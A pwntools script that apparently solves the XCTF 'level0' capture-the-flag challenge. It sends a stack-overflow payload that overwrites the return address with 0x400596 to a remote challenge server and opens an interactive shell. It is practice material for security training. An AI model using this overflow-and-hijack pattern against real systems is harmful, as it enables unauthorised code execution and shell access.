from pwn import *

path="/mnt/e/S/CTF/XCTF/pwn/level0"

#payload=b'a'*(128+8)+p64(0x00400596)
payload = b'A' * 0x80 + b'a' * 0x8 + p64(0x00400596)
#sh=process(path)
sh=remote('111.200.241.244',56556)

#sh.recvuntil("Hello, World\n")

sh.sendline(payload)

sh.interactive()